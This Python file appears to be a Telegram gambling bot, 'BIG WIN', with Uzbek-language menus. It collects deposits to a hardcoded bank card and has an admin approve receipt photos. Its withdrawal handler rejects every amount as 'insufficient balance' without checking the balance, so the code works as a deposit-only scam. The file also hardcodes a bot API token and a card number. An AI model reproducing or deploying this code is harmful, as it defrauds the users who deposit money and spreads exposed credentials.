from keep_alive import keep_alive
keep_alive()

import telebot
from telebot import types

API_TOKEN = "6940986191:AAGZGcitp0REh85bT6n5CY79K3S5elh41JI"
ADMIN_ID = 5815294733
CARD_NUMBER = "9860 6067 5024 7151"

bot = telebot.TeleBot(API_TOKEN)

users = {}
pending = {}

# ================= KEYBOARDS =================
def main_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("💳 Hisob to‘ldirish", "💸 Mablag‘ chiqarish")
    kb.add("📊 Balans")
    return kb

def paid_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("✅ To‘lov qildim")
    kb.add("⬅️ Ortga")
    return kb

def admin_inline(user_id):
    kb = types.InlineKeyboardMarkup()
    kb.add(
        types.InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"confirm:{user_id}"),
        types.InlineKeyboardButton("❌ Rad etish", callback_data=f"reject:{user_id}")
    )
    return kb

# ================= START =================
@bot.message_handler(commands=["start"])
def start(msg):
    users[msg.from_user.id] = {"balance": 0, "step": None}
    bot.send_message(msg.chat.id,
                     "🎉 Xush kelibsiz!\nSiz BIG WIN botidasiz 🎰",
                     reply_markup=main_keyboard())

# ================= HISOB TOLDIRISH =================
@bot.message_handler(func=lambda m: m.text=="💳 Hisob to‘ldirish")
def deposit(msg):
    users[msg.from_user.id]["step"] = "amount"
    bot.send_message(msg.chat.id, "💰 Qancha pul kiritmoqchisiz?")

@bot.message_handler(func=lambda m: users.get(m.from_user.id, {}).get("step")=="amount")
def get_amount(msg):
    if not msg.text.isdigit():
        bot.send_message(msg.chat.id, "❌ Faqat raqam kiriting")
        return
    users[msg.from_user.id]["amount"] = int(msg.text)
    users[msg.from_user.id]["step"] = "username"
    bot.send_message(msg.chat.id, "🆔 O‘yin ichidagi ID yoki ismingizni yozing")

@bot.message_handler(func=lambda m: users.get(m.from_user.id, {}).get("step")=="username")
def get_username(msg):
    users[msg.from_user.id]["username"] = msg.text
    users[msg.from_user.id]["step"] = "waiting_payment"
    bot.send_message(msg.chat.id,
                     f"✅ Qabul qilindi\n\n💳 KARTA:\n{CARD_NUMBER}\n👤 BIG WIN\n\nPulni o‘tkazib bo‘lgach tugmani bosing 👇",
                     reply_markup=paid_keyboard())

# ================= TO‘LOV QILDIM =================
@bot.message_handler(func=lambda m: m.text=="✅ To‘lov qildim")
def paid(msg):
    users[msg.from_user.id]["step"] = "send_check"
    bot.send_message(msg.chat.id, "📸 Iltimos, CHEK RASMINI yuboring")

# ================= CHEK QABUL =================
@bot.message_handler(content_types=['photo'])
def get_check(msg):
    if users.get(msg.from_user.id, {}).get("step") != "send_check":
        return
    pending[msg.from_user.id] = users[msg.from_user.id]
    bot.send_photo(
        ADMIN_ID,
        msg.photo[-1].file_id,
        caption=f"💰 YANGI TO‘LOV\n\n👤 User: @{msg.from_user.username}\n🆔 ID: {msg.from_user.id}\n💵 Summa: {users[msg.from_user.id]['amount']} so‘m\n🎮 Ism: {users[msg.from_user.id]['username']}",
        reply_markup=admin_inline(msg.from_user.id)
    )
    bot.send_message(msg.chat.id, "⏳ To‘lov tekshirilmoqda...")

# ================= ADMIN TASDIQLASH =================
@bot.callback_query_handler(func=lambda call: call.data.startswith(("confirm","reject")))
def admin_action(call):
    if call.from_user.id != ADMIN_ID:
        return
    action, user_id = call.data.split(":")
    user_id = int(user_id)
    if user_id not in pending:
        call.answer("Topilmadi", show_alert=True)
        return
    if action=="confirm":
        users[user_id]["balance"] += pending[user_id]["amount"]
        bot.send_message(user_id, "✅ Hisobingizga pul tushdi")
    else:
        bot.send_message(user_id, "❌ To‘lov rad etildi")
    pending.pop(user_id)
    call.answer("Bajarildi")

# ================= BALANS =================
@bot.message_handler(func=lambda m: m.text=="📊 Balans")
def balance(msg):
    bot.send_message(msg.chat.id, f"💰 Balansingiz: {users[msg.from_user.id]['balance']} so‘m")

# ================= MABLAG CHIQARISH =================
@bot.message_handler(func=lambda m: m.text=="💸 Mablag‘ chiqarish")
def withdraw(msg):
    bot.send_message(msg.chat.id, "💸 Qancha pul yechmoqchisiz?")

@bot.message_handler(func=lambda m: m.text.isdigit())
def deny_withdraw(msg):
    bot.send_message(msg.chat.id, "❌ Balansingizda yetarli mablag‘ yo‘q")

# ================= ORTGA =================
@bot.message_handler(func=lambda m: m.text=="⬅️ Ortga")
def back(msg):
    users[msg.from_user.id]["step"] = None
    bot.send_message(msg.chat.id, "🏠 Asosiy menyu", reply_markup=main_keyboard())

# ================= ADMIN PANEL =================
@bot.message_handler(commands=["admin"])
def admin_panel(msg):
    if msg.from_user.id != ADMIN_ID:
        return
    bot.send_message(msg.chat.id, "🛠 ADMIN PANEL\n\n📢 Reklama\n💰 To‘lovlar\n👥 Foydalanuvchilar")

# ================= RUN =================
print("Bot ishga tushdi...")
bot.infinity_polling()
